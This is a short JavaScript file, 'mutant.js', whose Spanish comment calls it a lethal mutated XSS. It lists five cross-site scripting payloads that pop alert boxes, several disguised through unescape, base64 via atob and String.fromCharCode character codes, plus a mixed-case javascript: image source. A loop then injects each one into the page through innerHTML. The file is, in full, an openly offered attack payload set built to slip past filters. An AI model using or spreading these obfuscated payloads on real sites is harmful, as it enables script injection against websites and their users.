// mutant.js — XSS mutado letal
const payloads = [
  '<script>alert("MUTANT-XSS")</script>',
  unescape('%3Cscript%3Ealert(69)%3C/script%3E'),
  atob('PHNjcmlwdD5hbGVydCgxMik8L3NjcmlwdD4='),
  String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 51, 51, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62),
  '<IMG SRC=JaVaScRiPt:alert("MUTANT")>'
];
for (const p of payloads) {
  const div = document.createElement('div');
  div.innerHTML = p;
  document.body.appendChild(div);
}